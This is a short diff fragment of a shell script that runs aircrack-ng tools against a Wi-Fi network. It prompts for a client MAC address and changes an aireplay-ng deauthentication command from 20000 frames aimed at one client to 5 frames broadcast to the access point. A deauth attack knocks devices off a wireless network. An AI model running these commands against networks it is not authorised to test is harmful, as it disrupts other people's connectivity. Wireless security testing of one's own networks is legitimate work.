@@ -26,6 +26,6 @@ airodump-ng --bssid $bssid --channel $channel wlan0mon
 echo "mac:"
 read 'mac'
 
-aireplay-ng --deauth 20000 -a $bssid -c $mac wlan0mon;echo "test"
+aireplay-ng -0 5 -a $bssid wlan0mon;echo "test"
 
 
